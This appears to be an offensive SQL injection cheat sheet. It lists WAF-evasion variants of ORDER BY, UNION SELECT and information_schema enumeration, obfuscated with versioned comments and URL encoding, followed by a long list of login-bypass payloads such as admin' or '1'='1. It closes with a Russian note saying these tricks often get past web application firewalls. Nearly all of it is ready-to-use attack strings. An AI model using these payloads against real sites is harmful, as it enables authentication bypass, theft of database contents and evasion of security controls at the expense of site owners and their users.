```sql
ORDER BY —>
/*!50000Order*/by
/*!50000order*//*!50000by*/
/*!50000OrdeR*/By
/*!50000ORDER*//*!50000BY*/
/**A**/Order by
Order/**A**/By
/**/**/ORDER/**/BY/**/**/
Null' order by
O0x72der b0x7920
Union—>
/*!50000union select
/*!50000Union*//*!50000Select*/
/*!12345union*//*!12345select*/
/**A**/union select
union /**A**/ select
/*!50000%55nIoN*/ /*!50000%53eLeCt*/
+ #?1q %0AuNiOn all#qa%0A#%0AsEleCt
%23%0AUnion%23aaaaaaaaaa%0ASelect%23%0A1
+?UnI?On?+'SeL?ECT?
group_concat—>
group_concat(/*!12345table_name*/)
/*!50000group_concat*/(/*!50000table_name*/)
unhex(hex(group_concat(table_name)))
unhex(hex(/*!12345group_concat*/(table_name)))
unhex(hex(/*!50000group_concat*/(/*!table_name*/)))
from table_name—>
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
/*!50000frOm*/+/*!50000information_schema*/%252e/**/columns
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
```

# auth bypass
```
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

```
Часто WAF на сайте душит все попытки провести SQL-инъекцию и не дает нормально воткнуть кавычку и вставить привычный пэйлоад, однако, нехитрыми манипуляциями все же частенько его можно обойти.

Например, добавив управляющие символы (https://x.com/oualilweb/status/1754245617470066755) , типа %00, %0A и др. или вставив математические операции ('AND'1'=1*1 вместо 'AND'1'='1') или добавив специфичные комментарии типа /*!50000%55nIoN*/ /*!50000%53eLeCt*/ и многое другое.
```